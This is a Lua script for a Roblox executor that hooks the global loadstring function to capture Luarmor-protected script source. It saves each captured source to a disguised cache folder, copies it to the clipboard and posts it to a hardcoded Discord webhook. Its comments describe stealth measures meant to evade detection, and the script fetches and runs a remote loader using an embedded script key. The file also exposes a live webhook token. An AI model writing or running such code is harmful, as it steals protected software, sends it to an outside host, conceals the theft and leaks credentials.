--[[
  CAPTURE LUARMOR SOURCE → Discord webhook + file + clipboard
  Stealth: no print, generic names, cache-like path, delayed writes, minimal hook.
]]

local _K = "XEBGtoEqCvrdDyGxWPpcKrHYKGxvrijf"
local _U = "https://api.luarmor.net/files/v4/loaders/d4d2ab3a331f01b3bad075746b35b9f7.lua"
local _W = "https://discord.com/api/webhooks/1479152924402647231/rtgjUt8LjlCdNjhIAdJGY9xJGDffQuH37d3kdy9DOPTcYycCW9Cd1J-6lYafDFFDP6-K"

local _n = 0
local _ls = loadstring

-- Write to path that looks like cache, not "captured"
local _dir = "static_content_130525"
local _base = "cfg"

local function _save(s)
	if type(s) ~= "string" or #s < 600 then return end
	_n = _n + 1
	-- Delay so it's not tied to loadstring call
	(task and task.defer or spawn or function(f) f() end)(function()
		pcall(function() if makefolder then makefolder(_dir) end end)
		pcall(function()
			if writefile then
				-- Looks like config/cache, not capture
				local name = _dir .. "/" .. _base .. (_n == 1 and "" or tostring(_n)) .. ".lua"
				writefile(name, s)
			end
		end)
		pcall(function() if setclipboard then setclipboard(s) end end)
		-- Webhook delayed and generic (no "Luarmor"/"capture" in content)
		pcall(function()
			if game and game.GetService then
				local H = game:GetService("HttpService")
				local body = H:JSONEncode({
					content = ("%d chars"):format(#s),
					embeds = { { description = "```lua\n" .. s:sub(1, 3900) .. (#s > 3900 and "\n..." or "") .. "\n```" } }
				})
				H:PostAsync(_W, body)
			elseif type(request) == "function" then
				local q = function(x) return ("%q"):format(tostring(x):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r")) end
				request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = "{\"content\":" .. q(#s .. " chars") .. ",\"embeds\":[{\"description\":" .. q("```lua\n" .. s:sub(1, 3900) .. "\n```") .. "}]}" })
			end
		end)
	end)
end

-- Single replacement; return same as original (no extra upvalues from our script in the chain)
loadstring = function(src, name)
	if type(src) == "string" then _save(src) end
	return _ls(src, name)
end

script_key = _K
loadstring(game:HttpGet(_U))()
